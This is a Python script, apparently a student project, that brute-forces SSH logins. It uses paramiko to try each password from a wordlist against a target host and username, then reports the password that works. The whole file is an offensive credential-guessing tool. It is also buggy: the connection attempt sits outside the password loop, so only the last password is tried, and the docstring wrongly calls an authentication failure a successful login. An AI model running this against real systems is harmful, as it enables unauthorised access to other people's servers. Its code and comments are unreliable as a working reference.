import paramiko, sys, os, socket, termcolor

def ssh_connect(host, username, password, value=0):
    """
    The ssh_connect function is intended to take variables passed during a loop
    and invoke the paramiko ssh.connect function. We have added a little bit of 
    terminal coloration because we are able to and it was a good way to troubleshoot
    if a SSH connection was made or not. 
    The value=0 variable's sole purpose is to detect change and be returned. The
    default value is 0 and if the function returns anything else, main will decide
    what action to take.
    """
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        # invoke the ssh.connect function and pass 4 parameters
        ssh.connect(host, port=22, username=username, password=password)
        print("\033[1;36;40m SSH Connection Established to " + host)
    except paramiko.AuthenticationException:
        value = 1
    except socket.error as e:
        value = 2

    # close the ssh connection
    # return value
    ssh.close()
    return value


def main():
    """
    The main function does several things here. 
    First, an input message is displayed (color coded) and the target variables are allocated.
    We decided to take an idea from our port scanner and use the socket.gethostbyname function
    to convert any hostnames to IPs for the sake of simplicity. 
    After input is taken, the code checks to make sure the provided wordlist does exist, amd
    exits the program if it does not. After confirming the document exists,
    a file stream is opened and each line is stripped and fed into the 
    ssh_connect function alongside the target IP and a value of 0.
    The Paramiko function above takes an AuthenticationException as a successful 
    login and returns a value of 1, which allows us to determine when we have 
    the correct password.
    If no correct password is found, incorrect login is dislayed. Similarly, 
    if any connection errors occur, a message will show. Since these are negative
    outcomes, we decided they should be red and success is green. 
    """
    # Prompt the user to enter target, username, and the password file
    target = input('\033[1;34;40m Please enter the target username or IP: \a')
    verified_target = socket.gethostbyname(target)
    uname = input('\033[1;34;40m Please enter the user you would like to connect with: \a')
    filepath = input('\033[1;34;40m Please input the path to the password wordlist: \a')
    
    # check if the file exists
    # if not, exit
    if os.path.exists(filepath) == True:
        pass
    else:
        print('\033[1;31;40m File does not exist. Exiting..')
        sys.exit()

    with open(filepath, 'r') as file:
        # iterate over each line
        # strip the empty characters at the end, store in a password variable
        for line in file:
            stripped_password = line.strip()
            print('\033[0;37;40m Trying Password: ' + stripped_password)
            
        try:
            # invoke ssh_connect function and pass target, username, and password
            # store the return value in a variable
            # if return value is 0
            # print 'found password', print the password, and break out the program
            # else if the return value is 1
            # print 'incorrect login'
            # else if the return value is 2
            # print 'connection error'
            # sys.exit()
            code = ssh_connect(verified_target, uname, stripped_password, value=0)
            if code == 0:
                print("\033[2;32;40m Found password: " + stripped_password)
            elif code == 1:
                print ("\033[1;31;40m Incorrect Login")
            else:
                print("\033[1;31;40m Connection error")
                sys.exit()
            
            
        except Exception as e:
            print(e)
            pass
                
if __name__ == '__main__':
    main()